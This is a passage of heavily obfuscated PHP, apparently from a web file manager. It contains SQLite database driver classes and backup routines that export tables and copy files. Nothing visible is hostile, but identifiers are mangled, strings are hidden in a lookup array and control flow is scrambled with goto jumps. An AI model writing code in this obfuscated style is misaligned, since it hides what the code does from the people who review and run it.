$bÛ¦ô©Ç„Ä; } protected function display($DäÌøó‰µ) { ob_end_clean(); extract($this->values); require $this->tpl . $DäÌøó‰µ; } } class DbSqliteBase extends Db { public function __construct($Dù‰œ‘² = '') { $c¢„îÅßä± =& $_SERVER[›é¼±]; if (!extension_loaded($c¢„îÅßä±[9])) { think_exception(think_lang($c¢„îÅßä±[10]) . $c¢„îÅßä±[11]); } if (!empty($Dù‰œ‘²)) { if (!isset($Dù‰œ‘²[$c¢„îÅßä±[12]])) { $Dù‰œ‘²[$c¢„îÅßä±[12]] = 438; } $this->config = $Dù‰œ‘²; if (empty($this->config[$c¢„îÅßä±[13]])) { $this->config[$c¢„îÅßä±[13]] = array(); } } } public function connect($fö©ñ´Î = '', $eòÛƒ¦Š· = 0) { $E¥¡ì¼Ç©ï =& $_SERVER[›é¼±]; if (!isset($this->linkID[$eòÛƒ¦Š·])) { goto DŞ†àìó¬; dŠë»Âç«´: @sqlite_busy_timeout($this->linkID[$eòÛƒ¦Š·], 30000); if (1 != think_config($E¥¡ì¼Ç©ï[18])) { unset($this->config); } goto dÛ’ÄªçÑ‡; bõŒôÛóë: $this->linkID[$eòÛƒ¦Š·] = $B—Ò äğ’º($fö©ñ´Î[$E¥¡ì¼Ç©ï[17]], $fö©ñ´Î[$E¥¡ì¼Ç©ï[12]]); if (!$this->linkID[$eòÛƒ¦Š·]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto dŠë»Âç«´; DŞ†àìó¬: if (empty($fö©ñ´Î)) { $fö©ñ´Î = $this->config; } $F‹ÒÆ²‘ = !empty($fö©ñ´Î[$E¥¡ì¼Ç©ï[13]][$E¥¡ì¼Ç©ï[14]]) ? $fö©ñ´Î[$E¥¡ì¼Ç©ï[13]][$E¥¡ì¼Ç©ï[14]] : $this->pconnect; $B—Ò äğ’º = $F‹ÒÆ²‘ ? $E¥¡ì¼Ç©ï[15] : $E¥¡ì¼Ç©ï[16]; goto bõŒôÛóë; dÛ’ÄªçÑ‡: } return $this->linkID[$eòÛƒ¦Š·]; } public function free() { $this->queryID = null; } public function query($F—ìç£óÑ) { goto a·­ÛÔ…Ì; aÈ££‰àÎ‰: $this->queryStr = $F—ìç£óÑ; if ($this->queryID) { $this->free(); } think_action_status($dŸÒŒ‰ßé[19], 1); goto B†ÔƒÅ©Ë; a·­ÛÔ…Ì: $dŸÒŒ‰ßé =& $_SERVER[›é¼±]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto aÈ££‰àÎ‰; B†ÔƒÅ©Ë: think_status($dŸÒŒ‰ßé[20]); $this->queryID = sqlite_query($this->_linkID, $F—ìç£óÑ); $this->debug(); goto dŠŠ˜òßœ; dŠŠ˜òßœ: if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $FÜ¸ñÎ²ğƒ = $this->getAll(); return $FÜ¸ñÎ²ğƒ; } goto Dë­ó‹Ñ½; Dë­ó‹Ñ½: } public function execute($B©Á²»õ¶µ) { goto b„¾×â‡Ñ; bƒùˆ”Ù—×: $this->queryStr = $B©Á²»õ¶µ; if ($this->queryID) { $this->free(); } think_action_status($d­ğ£—¦èŞ[21], 1); goto d‘¾Ü«†ŞÉ; d‘¾Ü«†ŞÉ: think_status($d­ğ£—¦èŞ[20]); $cÙ¦ÊÌ„¬Ô = sqlite_exec($this->_linkID, $B©Á²»õ¶µ); $this->debug(); goto Aó¶‹ƒÔ×; Aó¶‹ƒÔ×: if (!1 === $cÙ¦ÊÌ„¬Ô) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto c”ßÉ˜¨¯Û; b„¾×â‡Ñ: $d­ğ£—¦èŞ =& $_SERVER[›é¼±]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto bƒùˆ”Ù—×; c”ßÉ˜¨¯Û: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[›é¼±][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $eÌ±–ÓÖ = sqlite_query($this->_linkID, $_SERVER[›é¼±][23]); if (!$eÌ±–ÓÖ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $Cê«ë”ôË = sqlite_query($this->_linkID, $_SERVER[›é¼±][24]); if (!$Cê«ë”ôË) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $A‡ˆñ›˜¸› = array(); if ($this->numRows > 0) { for ($CÕŒîéĞè­ = 0; $CÕŒîéĞè­ < $this->numRows; $CÕŒîéĞè­++) { $A‡ˆñ›˜¸›[$CÕŒîéĞè­] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $A‡ˆñ›˜¸›; } public function getFields($d¹ºÙ£‘ƒ) { $c†ÚÑ ëÆÀ =& $_SERVER[›é¼±]; $Döõ×Ì©œš = $this->query($c†ÚÑ ëÆÀ[25] . $d¹ºÙ£‘ƒ . $c†ÚÑ ëÆÀ[26]); $c¿ñ’İÖá÷ = array(); if ($Döõ×Ì©œš) { foreach ($Döõ×Ì©œš as $c¶²½³‚³ => $c™ñå§‰’Ú) { $c¿ñ’İÖá÷[$c™ñå§‰’Ú[$c†ÚÑ ëÆÀ[27]]] = array($c†ÚÑ ëÆÀ[28] => $c™ñå§‰’Ú[$c†ÚÑ ëÆÀ[27]], $c†ÚÑ ëÆÀ[29] => $c™ñå§‰’Ú[$c†ÚÑ ëÆÀ[30]], $c†ÚÑ ëÆÀ[31] => (bool) ($c™ñå§‰’Ú[$c†ÚÑ ëÆÀ[32]] === $c†ÚÑ ëÆÀ[33]), $c†ÚÑ ëÆÀ[34] => $c™ñå§‰’Ú[$c†ÚÑ ëÆÀ[35]], $c†ÚÑ ëÆÀ[36] => strtolower($c™ñå§‰’Ú[$c†ÚÑ ëÆÀ[37]]) == $c†ÚÑ ëÆÀ[38], $c†ÚÑ ëÆÀ[39] => strtolower($c™ñå§‰’Ú[$c†ÚÑ ëÆÀ[40]]) == $c†ÚÑ ëÆÀ[41]); } } return $c¿ñ’İÖá÷; } public function getTables($cº¾Ò†äÄ¹ = '') { $Aå…µòóÖß =& $_SERVER[›é¼±]; $B—¸ç½Öàõ = $this->query($Aå…µòóÖß[42] . $Aå…µòóÖß[43] . $Aå…µòóÖß[44]); $BŞƒŠ³µÈ = array(); foreach ($B—¸ç½Öàõ as $BÙ…½ğÑ   => $a˜ó›µ‘—Ï) { $BŞƒŠ³µÈ[$BÙ…½ğÑ  ] = current($a˜ó›µ‘—Ï); } return $BŞƒŠ³µÈ; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $Dî³ë£é›½ =& $_SERVER[›é¼±]; $d­œøàîø = sqlite_last_error($this->_linkID); $this->error = $d­œøàîø . $Dî³ë£é›½[4] . sqlite_error_string($d­œøàîø); if ($Dî³ë£é›½[33] != $this->queryStr) { $this->error .= LNG($Dî³ë£é›½[45]) . $this->queryStr; } think_trace($this->error, $Dî³ë£é›½[33], $Dî³ë£é›½[46]); return $this->error; } public function escapeString($e˜‘ãÙö) { return sqlite_escape_string($e˜‘ãÙö); } public function parseLimit($a¸ø¼Š©‹¨) { $Dè×‡İÔ°ö =& $_SERVER[›é¼±]; $C¼‡³×•Æ† = $Dè×‡İÔ°ö[33]; if (!empty($a¸ø¼Š©‹¨)) { $a¸ø¼Š©‹¨ = explode($Dè×‡İÔ°ö[47], $a¸ø¼Š©‹¨); if (count($a¸ø¼Š©‹¨) > 1) { $C¼‡³×•Æ† .= $Dè×‡İÔ°ö[48] . $a¸ø¼Š©‹¨[1] . $Dè×‡İÔ°ö[49] . $a¸ø¼Š©‹¨[0] . $Dè×‡İÔ°ö[50]; } else { $C¼‡³×•Æ† .= $Dè×‡İÔ°ö[48] . $a¸ø¼Š©‹¨[0] . $Dè×‡İÔ°ö[50]; } } return $C¼‡³×•Æ†; } } class DbSqlite3Base extends Db { public function __construct($c¼²ŸìÃå¥ = '') { $eÈª²ó¾— =& $_SERVER[›é¼±]; if (!class_exists($eÈª²ó¾—[51])) { think_exception(think_lang($eÈª²ó¾—[10]) . $eÈª²ó¾—[52]); } if (!empty($c¼²ŸìÃå¥)) { if (!isset($c¼²ŸìÃå¥[$eÈª²ó¾—[12]])) { $c¼²ŸìÃå¥[$eÈª²ó¾—[12]] = 438; } $this->config = $c¼²ŸìÃå¥; if (empty($this->config[$eÈª²ó¾—[13]])) { $this->config[$eÈª²ó¾—[13]] = array(); } } } public function connect($E‡¢¯¹‰¤‘ = '', $BãèÖÌÜŠ£ = 0) { $cØ®¥„±£ =& $_SERVER[›é¼±]; if (!isset($this->linkID[$BãèÖÌÜŠ£])) { if (empty($E‡¢¯¹‰¤‘)) { $E‡¢¯¹‰¤‘ = $this->config; } $this->linkID[$BãèÖÌÜŠ£] = new SQLite3($E‡¢¯¹‰¤‘[$cØ®¥„±£[17]]); if (!$this->linkID[$BãèÖÌÜŠ£]) { think_exception($this->linkID[$BãèÖÌÜŠ£]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$BãèÖÌÜŠ£]->busyTimeout(30000); if (1 != think_config($cØ®¥„±£[18])) { unset($this->config); } } return $this->linkID[$BãèÖÌÜŠ£]; } public function free() { $this->queryID = null; } public function query($eß‚ˆ¢”ÓÜ) { goto c¿½ÈƒáÅ; B¨òĞˆñÎ: if (!1 === $this->queryID) { $this->error(); return !1; } else { $A×®İå˜‡› = $this->getAll(); $this->numRows = count($A×®İå˜‡›); return $A×®İå˜‡›; } goto fÏ©Á‹‘¹Ü; BÎ‡ˆŸ´ÏÒ: think_status($BÈ·µĞ±ù’[20]); $this->queryID = $this->_linkID->query($eß‚ˆ¢”ÓÜ); $this->debug(); goto B¨òĞˆñÎ; c…‘Ï¨ƒ—“: $this->queryStr = $eß‚ˆ¢”ÓÜ; if ($this->queryID) { $this->free(); } think_action_status($BÈ·µĞ±ù’[19], 1); goto BÎ‡ˆŸ´ÏÒ; c¿½ÈƒáÅ: $BÈ·µĞ±ù’ =& $_SERVER[›é¼±]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto c…‘Ï¨ƒ—“; fÏ©Á‹‘¹Ü: } public function execute($Dã¿¦”ò‰) { goto FñãÓËîÕ÷; FñãÓËîÕ÷: $CêÈ·¯«’ =& $_SERVER[›é¼±]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto aŞ´áò¶Æ; AÇİäïã¡: if (!1 === $b¤›ŸÏëô¦) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto DÀ–Û‡õ¶ˆ; aŞ´áò¶Æ: $this->queryStr = $Dã¿¦”ò‰; if ($this->queryID) { $this->free(); } think_action_status($CêÈ·¯«’[21], 1); goto DŒÉè½Äè; DŒÉè½Äè: think_status($CêÈ·¯«’[20]); $b¤›ŸÏëô¦ = $this->_linkID->exec($Dã¿¦”ò‰); $this->debug(); goto AÇİäïã¡; DÀ–Û‡õ¶ˆ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[›é¼±][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $dÄÏ†Ñ¯ = $this->_linkID->query($_SERVER[›é¼±][23]); if (!$dÄÏ†Ñ¯) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $CáÆªÓÓÊ­ = $this->_linkID->query($_SERVER[›é¼±][24]); if (!$CáÆªÓÓÊ­) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $e‰à£ìÖµ„ = array(); while ($AÌÒô¿à¦¥ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $e‰à£ìÖµ„[] = $AÌÒô¿à¦¥; } $this->queryID->reset(); return $e‰à£ìÖµ„; } public function getFields($CŸÈöÒ¼½š) { $BÒ…¥ÉÀê¿ =& $_SERVER[›é¼±]; $f–âŒ°²Ñƒ = $this->query($BÒ…¥ÉÀê¿[25] . $CŸÈöÒ¼½š . $BÒ…¥ÉÀê¿[26]); $F‡ÙôßáÛó = array(); if ($f–âŒ°²Ñƒ) { foreach ($f–âŒ°²Ñƒ as $FƒÆåÑš¬— => $e‰ÌÓª³‰‘) { $F‡ÙôßáÛó[$e‰ÌÓª³‰‘[$BÒ…¥ÉÀê¿[28]]] = array($BÒ…¥ÉÀê¿[28] => $e‰ÌÓª³‰‘[$BÒ…¥ÉÀê¿[28]], $BÒ…¥ÉÀê¿[29] => $e‰ÌÓª³‰‘[$BÒ…¥ÉÀê¿[29]], $BÒ…¥ÉÀê¿[31] => (bool) ($e‰ÌÓª³‰‘[$BÒ…¥ÉÀê¿[31]] === $BÒ…¥ÉÀê¿[33]), $BÒ…¥ÉÀê¿[34] => $e‰ÌÓª³‰‘[$BÒ…¥ÉÀê¿[53]], $BÒ…¥ÉÀê¿[36] => (bool) $e‰ÌÓª³‰‘[$BÒ…¥ÉÀê¿[54]], $BÒ…¥ÉÀê¿[39] => (bool) $e‰ÌÓª³‰‘[$BÒ…¥ÉÀê¿[54]]); } } return $F‡ÙôßáÛó; } public function getTables($F×É‰Ôâ— = '') { $f‹÷¤İàÏ› =& $_SERVER[›é¼±]; $B¸‚ë³ë¸š = $this->query($f‹÷¤İàÏ›[42] . $f‹÷¤İàÏ›[43] . $f‹÷¤İàÏ›[44]); $c±šä‹ç„¥ = array(); foreach ($B¸‚ë³ë¸š as $Bƒ¢îÒæ¼Ã => $F½˜ò×·ÇØ) { $c±šä‹ç„¥[$Bƒ¢îÒæ¼Ã] = current($F½˜ò×·ÇØ); } return $c±šä‹ç„¥; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $b„©¾óé›Ò =& $_SERVER[›é¼±]; $this->error = $this->_linkID->lastErrorMsg(); if ($b„©¾óé›Ò[33] != $this->queryStr) { $this->error .= LNG($b„©¾óé›Ò[45]) . $this->queryStr; } think_trace($this->error, $b„©¾óé›Ò[33], $b„©¾óé›Ò[46]); return $this->error; } public function escapeString($b²ÁÕ£²ÆÛ) { $A¥˜ØËŞù¦ =& $_SERVER[›é¼±]; if ($this->_linkID) { return $this->_linkID->escapeString($b²ÁÕ£²ÆÛ); } return str_ireplace($A¥˜ØËŞù¦[55], $A¥˜ØËŞù¦[56], $b²ÁÕ£²ÆÛ); } public function parseLimit($Bñ’‘Û’â—) { $aš™³¿ÌÎ¶ =& $_SERVER[›é¼±]; $Bš°ŞøÌ™¿ = $aš™³¿ÌÎ¶[33]; if (!empty($Bñ’‘Û’â—)) { $Bñ’‘Û’â— = explode($aš™³¿ÌÎ¶[47], $Bñ’‘Û’â—); if (count($Bñ’‘Û’â—) > 1) { $Bš°ŞøÌ™¿ .= $aš™³¿ÌÎ¶[48] . $Bñ’‘Û’â—[1] . $aš™³¿ÌÎ¶[49] . $Bñ’‘Û’â—[0] . $aš™³¿ÌÎ¶[50]; } else { $Bš°ŞøÌ™¿ .= $aš™³¿ÌÎ¶[48] . $Bñ’‘Û’â—[0] . $aš™³¿ÌÎ¶[50]; } } return $Bš°ŞøÌ™¿; } } goto DŒÅ‰¥º¥•; AÁœÕœ¹Ÿ: class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto eÖå¦Ğºµ; CÆã­´›º”: self::$name = $EÛ“ËŞ¯¥Á[$aïÄÔÄ´õ[28]]; $eÔ…ğï¬†Ÿ = $GLOBALS[$aïÄÔÄ´õ[6]][$aïÄÔÄ´õ[17]]; $a®Î…áÅ§¾ = $this->_dbType($eÔ…ğï¬†Ÿ); goto FÌŒæ²¢ÅÅ; FÌŒæ²¢ÅÅ: $AîĞ„¼—ø = new DbManage($eÔ…ğï¬†Ÿ, $a®Î…áÅ§¾); $b¹Èº Šœ½ = array($aïÄÔÄ´õ[771] => $a®Î…áÅ§¾, $aïÄÔÄ´õ[772] => time()); Backup::set($b¹Èº Šœ½); goto e³‹îÌ…Â; AŒÏ†óù·‚: if (isset($eï¿‚Ó­º©->task[$aïÄÔÄ´õ[783]])) { $b–‹Ñòìà– = $eï¿‚Ó­º©->task[$aïÄÔÄ´õ[783]] ? $eï¿‚Ó­º©->task[$aïÄÔÄ´õ[783]] : timeFloat(); $bèÛ¬‡¹ = $b–‹Ñòìà– - $eï¿‚Ó­º©->task[$aïÄÔÄ´õ[784]]; if ($bèÛ¬‡¹ >= 0.2) { $Eøô•¤†Ÿ› += 1; } } $eï¿‚Ó­º©->end(); $b¹Èº Šœ½ = array($aïÄÔÄ´õ[771] => $a®Î…áÅ§¾, $aïÄÔÄ´õ[768] => 1, $aïÄÔÄ´õ[785] => $Eøô•¤†Ÿ›, $aïÄÔÄ´õ[786] => $F¥ˆ§äÈÆ, $aïÄÔÄ´õ[787] => time()); goto Dğê—­Â´; Dğê—­Â´: Backup::set($b¹Èº Šœ½); if ($Eøô•¤†Ÿ› - $F¥ˆ§äÈÆ > 1) { $Dí¹ö¶£‹ = $aïÄÔÄ´õ[788]; if (stristr(I18n::getType(), $aïÄÔÄ´õ[789])) { $Dí¹ö¶£‹ = $aïÄÔÄ´õ[790]; } write_log(array($Dí¹ö¶£‹, $b¹Èº Šœ½), $aïÄÔÄ´õ[777]); return !1; } return !0; goto aŸÔßİÕ×©; e³‹îÌ…Â: $dËõÙè‚Ş‘ = $this->tmpFilesPath() . $aïÄÔÄ´õ[773] . self::$name . $aïÄÔÄ´õ[8]; del_dir($dËõÙè‚Ş‘); mk_dir($dËõÙè‚Ş‘); goto bè£ƒÊ­İÆ; eÖå¦Ğºµ: $aïÄÔÄ´õ =& $_SERVER[›é¼±]; $EÛ“ËŞ¯¥Á = Backup::get(); self::$io = $EÛ“ËŞ¯¥Á[$aïÄÔÄ´õ[747]]; goto CÆã­´›º”; f»¥³¸­™÷: foreach ($AÕ“£º½É as $dÉÓßÒÚ·) { $Eøô•¤†Ÿ› += $AîĞ„¼—ø->model($dÉÓßÒÚ·)->count(); } $eï¿‚Ó­º© = new Task($aïÄÔÄ´õ[776], $aïÄÔÄ´õ[777], $Eøô•¤†Ÿ›, LNG($aïÄÔÄ´õ[778]) . $aïÄÔÄ´õ[779] . LNG($aïÄÔÄ´õ[780])); foreach ($AÕ“£º½É as $dÉÓßÒÚ·) { $a²§Œˆ‰ = $dËõÙè‚Ş‘ . $dÉÓßÒÚ· . $aïÄÔÄ´õ[781]; $EÛŠÑ‡†Á± = null; if ($dÉÓßÒÚ· == $aïÄÔÄ´õ[782] && (!isset($EÛ“ËŞ¯¥Á[$aïÄÔÄ´õ[750]]) || $EÛ“ËŞ¯¥Á[$aïÄÔÄ´õ[750]] == $aïÄÔÄ´õ[191])) { $EÛŠÑ‡†Á± = self::$io; } $F¥ˆ§äÈÆ += $AîĞ„¼—ø->sqlFromDb($dÉÓßÒÚ·, $a²§Œˆ‰, $eï¿‚Ó­º©, $EÛŠÑ‡†Á±); } goto AŒÏ†óù·‚; bè£ƒÊ­İÆ: $Eøô•¤†Ÿ› = $F¥ˆ§äÈÆ = 0; try { $AÕ“£º½É = $AîĞ„¼—ø->db()->getTables(); } catch (Exception $CøŒ¤âƒ) { return !1; } $AÕ“£º½É = array_diff($AÕ“£º½É, array($aïÄÔÄ´õ[774], $aïÄÔÄ´õ[775])); goto f»¥³¸­™÷; aŸÔßİÕ×©: } private function _dbType($eÛˆ£ÇöéÍ) { goto aåÔ‘Åè¢; cÙÛçÑæ÷: if ($DÈ§¦áÒºİ == $F”»Œ”¸‹Ê[792]) { $bî”°îê˜Ş = explode($F”»Œ”¸‹Ê[4], $eÛˆ£ÇöéÍ[$F”»Œ”¸‹Ê[793]]); $DÈ§¦áÒºİ = $bî”°îê˜Ş[0]; } $FÁáºëÔ®õ = array($F”»Œ”¸‹Ê[794] => $F”»Œ”¸‹Ê[9], $F”»Œ”¸‹Ê[795] => $F”»Œ”¸‹Ê[796]); if (isset($FÁáºëÔ®õ[$DÈ§¦áÒºİ])) { $DÈ§¦áÒºİ = $FÁáºëÔ®õ[$DÈ§¦áÒºİ]; } goto bÈÉ‘ø¤; bÈÉ‘ø¤: return $DÈ§¦áÒºİ; goto f§Ğ’’”½³; aåÔ‘Åè¢: $F”»Œ”¸‹Ê =& $_SERVER[›é¼±]; $eÛˆ£ÇöéÍ = array_change_key_case($eÛˆ£ÇöéÍ); $DÈ§¦áÒºİ = $eÛˆ£ÇöéÍ[$F”»Œ”¸‹Ê[791]]; goto cÙÛçÑæ÷; f§Ğ’’”½³: } private function tmpFilesPath() { $dÅ¬è˜Ë³ä =& $_SERVER[›é¼±]; $aæ³ÛÙÈŸ‚ = TEMP_FILES; if ($GLOBALS[$dÅ¬è˜Ë³ä[6]][$dÅ¬è˜Ë³ä[88]][$dÅ¬è˜Ë³ä[797]]) { $aæ³ÛÙÈŸ‚ = $GLOBALS[$dÅ¬è˜Ë³ä[6]][$dÅ¬è˜Ë³ä[88]][$dÅ¬è˜Ë³ä[797]]; if (!mk_dir($aæ³ÛÙÈŸ‚) || !is_writable($aæ³ÛÙÈŸ‚) || !IO::mkfile($aæ³ÛÙÈŸ‚ . $dÅ¬è˜Ë³ä[798])) { $aæ³ÛÙÈŸ‚ = TEMP_FILES; } } return $aæ³ÛÙÈŸ‚; } } class BackupDbFile { public function __construct() { } public function index() { goto EÀÏ‚ÈâÀÌ; fŒİÎ¬¼Â¼: $c®â¯±Ó = new TaskFileTransfer($B·ÁÂ†ò­å[801], $B·ÁÂ†ò­å[777], count($F³…é¥ôêÈ), LNG($B·ÁÂ†ò­å[778]) . $B·ÁÂ†ò­å[454] . LNG($B·ÁÂ†ò­å[780]) . $B·ÁÂ†ò­å[802]); $c®â¯±Ó->task[$B·ÁÂ†ò­å[758]] = $F†íîÓçêó; foreach ($b¯ÍÇÏ¼[$B·ÁÂ†ò­å[74]] as $FĞ¾åãôŸ«) { $C¾éöå„¨Ç = IO::move($FĞ¾åãôŸ«[$B·ÁÂ†ò­å[76]], $bÖ²÷’²½¯); if (!$C¾éöå„¨Ç) { $c®â¯±Ó->end(); $e‚Ò¼¬†ä = IO::getLastError($B·ÁÂ†ò­å[803] . $FĞ¾åãôŸ«[$B·ÁÂ†ò­å[76]] . $B·ÁÂ†ò­å[804] . $bÖ²÷’²½¯ . $B·ÁÂ†ò­å[530]); write_log($e‚Ò¼¬†ä, $B·ÁÂ†ò­å[777]); return !1; } } goto E¾õ¥½ùÜ; AÉòÚæâà: if (!$F†íîÓçêó) { return !1; } $B•¢óÀİà = array($B·ÁÂ†ò­å[799] => $F†íîÓçêó, $B·ÁÂ†ò­å[800] => time()); Backup::set($B•¢óÀİà); goto fŒİÎ¬¼Â¼; f†‘Ìíóæ¸: $cÃ²’•…ù = $this->tmpFilesPath() . "\x62\x61\x63\153\x75\160\137{$FÄ‚Ç‰ÈôÇ}\57"; $bÖ²÷’²½¯ = $this->backupPath($eºâË•î); if (!($bÖ²÷’²½¯ = IO::mkdir($bÖ²÷’²½¯))) { return !1; } goto c¹®ù°„Æ‡; c¹®ù°„Æ‡: $b¯ÍÇÏ¼ = IO::listPath($cÃ²’•…ù); $F³…é¥ôêÈ = isset($b¯ÍÇÏ¼[$B·ÁÂ†ò­å[74]]) ? $b¯ÍÇÏ¼[$B·ÁÂ†ò­å[74]] : array(); $F†íîÓçêó = array_sum(array_column($F³…é¥ôêÈ, $B·ÁÂ†ò­å[78])); goto AÉòÚæâà; EÀÏ‚ÈâÀÌ: $B·ÁÂ†ò­å =& $_SERVER[›é¼±]; $eºâË•î = Backup::get(); $FÄ‚Ç‰ÈôÇ = $eºâË•î[$B·ÁÂ†ò­å[28]]; goto f†‘Ìíóæ¸; b«Ï§ÖåŒ‹: Backup::set($B•¢óÀİà); return !0; goto e‹‚¸ö¿Í ; E¾õ¥½ùÜ: $d‚ÓŠØù²¹ = CONTROLLER_DIR . $B·ÁÂ†ò­å[805]; $f¡‡¶Üäç = CONTROLLER_DIR . $B·ÁÂ†ò­å[806]; IO::copy($d‚ÓŠØù²¹, $bÖ²÷’²½¯); goto CÆ‘¤š; CÆ‘¤š: IO::copy($f¡‡¶Üäç, $bÖ²÷’²½¯); $c®â¯±Ó->end(); $B•¢óÀİà = array($B·ÁÂ†ò­å[807] => $F†íîÓçêó, $B·ÁÂ†ò­å[808] => time()); goto b«Ï§ÖåŒ‹; e‹‚¸ö¿Í : } private function backupPath($c©¨¡œŞÄä) { $bÍëÊŞ²»‘ =& $_SERVER[›é¼±]; $A–¶Ğ´÷ãİ = $c©¨¡œŞÄä[$bÍëÊŞ²»‘[28]]; $DÔÍ¿µŞ¼ = Model($bÍëÊŞ²»‘[765])->get($bÍëÊŞ²»‘[766]); $f‚İ‡¦Œ²à = substr(md5($bÍëÊŞ²»‘[767] . $DÔÍ¿µŞ¼ . $A–¶Ğ´÷ãİ), 0, 8); return "\173\x69\157\x3a{$c©¨¡œŞÄä[$bÍëÊŞ²»‘[747]]}\x7d\x2f\144\141\x74\x61\142\141\163\x65\57\x62\x61\143\153\x75\x70\x2f" . $A–¶Ğ´÷ãİ . $bÍëÊŞ²»‘[71] . $f‚İ‡¦Œ²à; } private function tmpFilesPath() { $f¤»ÂÛìì› =& $_SERVER[›é¼±]; $BÌ®¤Åò = TEMP_FILES; if ($GLOBALS[$f¤»ÂÛìì›[6]][$f¤»ÂÛìì›[88]][$f¤»ÂÛìì›[797]]) { $BÌ®¤Åò = $GLOBALS[$f¤»ÂÛìì›[6]][$f¤»ÂÛìì›[88]][$f¤»ÂÛìì›[797]]; if (!mk_dir($BÌ®¤Åò) || !is_writable($BÌ®¤Åò) || !IO::mkfile($BÌ®¤Åò . $f¤»ÂÛìì›[798])) { $BÌ®¤Åò = TEMP_FILES; } } return $BÌ®¤Åò; } } class BackupFile { public function __construct() { } public function index() { goto añ­Òœ‡…¶; Dá«¶ã•á: $B‚Ì­àéÊÖ = $DÉß¬£éğÖ = 0; do { $dõÙ²‹‘ÁÊ = $_SERVER[›é¼±][816]; $AÓâ Á…İ¯ = Model($_SERVER[›é¼±][782])->where($D–Ü¡İã)->field($dõÙ²‹‘ÁÊ)->order($_SERVER[›é¼±][817])->selectPage($DˆöÆôÒÔÑ, $cˆ÷­Ãç­); $AïË˜‹¤É› = !empty($AÓâ Á…İ¯[$_SERVER[›é¼±][367]]) ? $AÓâ Á…İ¯[$_SERVER[›é¼±][367]] : array(); foreach ($AïË˜‹¤É› as $aä†¹¢¼°¤) { goto FÈï“ˆ›¥; AÑºÊø”Á: $aÙ£Å¯¯Ğ += $aä†¹¢¼°¤[$_SERVER[›é¼±][78]]; $DÉß¬£éğÖ += 1; $B‚Ì­àéÊÖ += $aä†¹¢¼°¤[$_SERVER[›é¼±][78]]; goto b×‰‰‰‡Ù¬; b×‰‰‰‡Ù¬: if ($aÙ£Å¯¯Ğ >= 1024 * 1024 * 100) { $Cò°µµ×Æ = array($_SERVER[›é¼±][822] => $A¥”šºÃåí, $_SERVER[›é¼±][823] => $DÉß¬£éğÖ, $_SERVER[›é¼±][824] => $B‚Ì­àéÊÖ); Backup::set($Cò°µµ×Æ); $aÙ£Å¯¯Ğ = $c¿¬õìî½à = 0; } goto e‹ğ«ãá; EìİÆøÌ½Ÿ: if (IO::exist($c…™Âòñ–Í)) { $c­²Í¼æ­->updateFileEnd($aä†¹¢¼°¤[$_SERVER[›é¼±][28]], $aä†¹¢¼°¤[$_SERVER[›é¼±][78]]); } else { $c…™Âòñ–Í = get_path_father($c…™Âòñ–Í); IO::mkdir($c…™Âòñ–Í); if (!IO::copy($EÔç÷ÄÚ, $c…™Âòñ–Í, $_SERVER[›é¼±][820])) { write_log($_SERVER[›é¼±][821] . $EÔç÷ÄÚ . $_SERVER[›é¼±][804] . $c…™Âòñ–Í . $_SERVER[›é¼±][530], $_SERVER[›é¼±][777]); $Cõ§¼çÂŸî = !1; break; } } $A¥”šºÃåí = $aä†¹¢¼°¤[$_SERVER[›é¼±][461]]; $c¿¬õìî½à += 1; goto AÑºÊø”Á; FÈï“ˆ›¥: if (!$this->_fileExist($aä†¹¢¼°¤, $Bæ°êäšØ, $E‚â’ÓŠÏ)) { $Eë£çÅ©¦Ç -= 1; $B¨É‚†ó•â -= (int) $aä†¹¢¼°¤[$_SERVER[›é¼±][78]]; write_log("\x66\x69\154\x65\x20\156\x6f\x74\x20\x65\170\x69\163\164\x2e\x66\x69\x6c\145\111\x44\x3a{$aä†¹¢¼°¤[$_SERVER[›é¼±][461]]}\54\x20\160\141\164\x68\x3a{$aä†¹¢¼°¤[$_SERVER[›é¼±][76]]}", $_SERVER[›é¼±][818]); continue; } $EÔç÷ÄÚ = $aä†¹¢¼°¤[$_SERVER[›é¼±][76]]; $c…™Âòñ–Í = "\x7b\151\x6f\x3a{$CÓ©‘Ò««Ô[$_SERVER[›é¼±][747]]}\175" . substr($EÔç÷ÄÚ, strlen("\x7b\151\157\x3a{$aä†¹¢¼°¤[$_SERVER[›é¼±][819]]}\x7d")); goto EìİÆøÌ½Ÿ; e‹ğ«ãá: } $CÂ‰ñ»ùà¸ = count($AïË˜‹¤É›); $cˆ÷­Ãç­++; } while ($CÂ‰ñ»ùà¸ == $DˆöÆôÒÔÑ); $c­²Í¼æ­->end(); goto eƒğ†¾¸™‹; BÁ”áæñš¸: $Cõ§¼çÂŸî = !0; $E‚â’ÓŠÏ = $this->storeIds(); $cˆ÷­Ãç­ = 1; goto C£ÎóÇÈà; añ­Òœ‡…¶: $CÓ©‘Ò««Ô = Backup::get(); 